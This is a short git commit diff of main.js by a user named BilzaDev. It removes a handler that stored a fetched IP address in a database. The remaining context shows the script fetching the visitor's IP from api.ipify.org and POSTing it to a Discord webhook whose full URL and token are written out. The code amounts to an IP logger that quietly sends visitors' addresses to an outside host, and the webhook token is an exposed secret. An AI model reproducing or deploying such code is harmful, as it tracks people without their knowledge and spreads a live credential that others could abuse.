a6b1a90bfedae777749d4b90b5673e88a2b344a1
BilzaDev <110744777+BilzaDev@users.noreply.github.com>
2022-10-18 21:02:46 +0100

    Update main.js

--- main.js
+++ main.js
@@ -3,10 +3,6 @@ xml.open("GET", "https://api.ipify.org")
 xml.send();
 xml.addEventListener("loadend",loaded);
 
-function loaded(e){
-  WriteDb(xml.responseText);
-}
-
 function sendip(ip){
   var request = new XMLHttpRequest();
   request.open("POST", "https://discord.com/api/webhooks/1032015261139738646/f_eEE8n52wkSZlFaUfxIvGoGBapFzou5GOAI2zULdAOrM-C4mxApxk4wehnkC1ptHFWf");
